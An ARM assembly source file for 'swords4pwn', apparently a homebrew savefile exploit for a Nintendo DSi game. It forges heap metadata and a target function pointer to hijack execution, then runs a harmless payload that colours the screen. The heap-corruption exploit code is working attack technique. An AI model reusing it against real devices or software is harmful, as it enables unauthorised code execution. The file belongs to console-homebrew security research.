/* swords4pwn by ChampionLeake */
/* 4swords dsiware exploit */
/* HUGE THANKS TO yellows8 as the original exploiter and helper */
/* Special thanks to everyone who tested and gave helpful advice */

.arch armv5te
.fpu softvfp
.eabi_attribute 23, 1
.eabi_attribute 24, 1
.eabi_attribute 25, 1
.eabi_attribute 26, 1
.eabi_attribute 30, 2
.eabi_attribute 18, 4

.global _start
.section .init
.arm

#define	REG_BASE 0x04000000

/* Courtesy from yellows8 4swordshax repo*/
#define HEAPCTX_ADR 0x2177090
#define HEAP_NEXTCHUNKADR 0x21770E8 @ added by 0x58 from the HEAPCTX ADDRESS
#define JUMPADR 0x21770F8 @ added by 0x10 from the HEAP_NEXTCHUNKADR
#define TARGET_FUNCPTR 0x20C9100


/* heaphax -- stage 0 */
/* attacking the heap functions */
_start:
.incbin "initial.bin"	@ base of the savefile

.word 0, 0
.word HEAPCTX_ADR
.word 0
.word 0
.word HEAPCTX_ADR+4
.space 0x24
.word HEAP_NEXTCHUNKADR
.word 0
.word 0
.word TARGET_FUNCPTR-12
.hword 0
.hword 0

.space 0x50-0x34

.word 0
.word 0x1000
.word TARGET_FUNCPTR-12
.word JUMPADR	@ jumps to the necessary address to run code

.align 2
code_start:
b code
.word 0
.word 0
.word 0 @ "The data here will be overwritten by the memalloc code, so branch around it." (yellows8)

/* magic -- stage 1 */
/* color screen payload */
/* thanks Gericom */
code:
mov r0, #0x04000000
mov r1, #0
str r1, [r0, #0x208]
str r1, [r0, #0x210]
ldr r2, [r0, #0x214]
str r2, [r0, #0x214]
mov r2, #(1<<16)
str r2, [r0]
str r1, [r0, #0x60]
mov r0, #0x05000000
ldr r1, =((30 << 10) | (19 << 5) | 12)	@ lightblue 5bit RGB color (hex color of #669ef9) http://neildowning.com/HEX_to_RGB_color_converter.php
strh r1, [r0]
bl delay  @ branches to the delay function 
b code_purple

/* stuckpixel delay loop code */
delay:
ldr r0, =10000000 @ time to wait
loop:
subs r0, #1 @ subtract 1
bne loop @ jump back if not zero
bx lr @ return

code_purple:
mov r0, #0x04000000
mov r1, #0
str r1, [r0, #0x208]
str r1, [r0, #0x210]
ldr r2, [r0, #0x214]
str r2, [r0, #0x214]
mov r2, #(1<<16)
str r2, [r0]
str r1, [r0, #0x60]
mov r0, #0x05000000
ldr r1, =((30 << 10) | (12 << 5) | 20)	@ lightpurple 5bit RGB color (hex color of #a566f9) http://neildowning.com/HEX_to_RGB_color_converter.php
strh r1, [r0]
b .	@ infinite loop
.pool
